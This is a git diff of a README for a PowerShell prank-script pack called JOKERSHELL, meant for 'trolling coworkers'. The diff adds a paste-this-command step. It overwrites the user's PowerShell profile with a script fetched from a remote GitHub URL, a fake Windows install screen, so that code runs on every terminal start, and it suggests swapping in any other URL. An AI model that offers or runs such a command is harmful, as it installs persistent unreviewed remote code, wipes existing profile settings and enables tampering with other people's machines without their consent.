@@ -1,53 +1,8 @@
-<!------------------- HEADER SECTION -------------------------->
-<header>
- <h1 align="center"><strong>d｡◕‿↼｡bづ</strong><br/>JOKERSHELL</h1>
-  <!-- BADGET BUTTONS -->
-<p align="center">
-  <img src="https://img.shields.io/badge/Status-Development-lightgray.svg?style=flat" />
-  <img src="https://img.shields.io/badge/License-MIT-blue.svg?style=flat" />
-  <img src="https://img.shields.io/badge/PowerShell-X.0-blue.svg" />
- </p>
-</header>
-<p></p> <!-- BLANK PARAGRAPH TO FIX HTML HEADER IN GITHUB PAGES TEMPLATE -->
-<!------------------- END OF HEADER SECTION -------------------->
+Paste this into a powershell and restart the terminal
 
-<!-- INTRODUCTION -->
+New-Item $profile -Type File -Force; $content = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/desl8/PShell/refs/heads/master/Browser/Fake-Install-Win10-11.ps1"; $content | Out-File -FilePath $profile;
 
-## 💬 Introduction  
-
-**JOKERSHELL** is a pack of funny powershell scripts for trolling coworkers (or wathever you want).
-<br/>
-<sup>You can use or share this document as you want, under [MIT](LICENSE) license. </sup><br/>
-
-`35`  Different kind of prank scripts (some its the same with other image or URL)<br/>
-`02`  Builder Prank Tools<br/>
-
-
-
-<!-- TABLE OF CONTENTS -->
-
-<details><summary>📑 Table of Contents(click to expand)</summary><p>
-
-- [Introduction](#-introduction)
-- [Features](#-features)
-- [Installation](#-installation)
-- [Contribute](#-contribute)
-- [Team](#-team)
-- [License](#-license)
----
-
-</p></details><br/>
-
-<!-- END TABLE OF CONTENTS -->
-
-> If you want to **improve** this project, please, **read** the [`Contributors section`](#-contribute).
-
-<!--########## END OF README.TEMPLATE INTRODUCTION ##########-->
-
-## 🏅 Features
-
-<!-- FEATURES ACHIEVED -->
-I would love to have a great list of features and make one section for it, but it will not be like that. You'll be glad of this little list.
+Replace the url with some other file if you want.
 
 
 | TYPE          | Description                                    | 
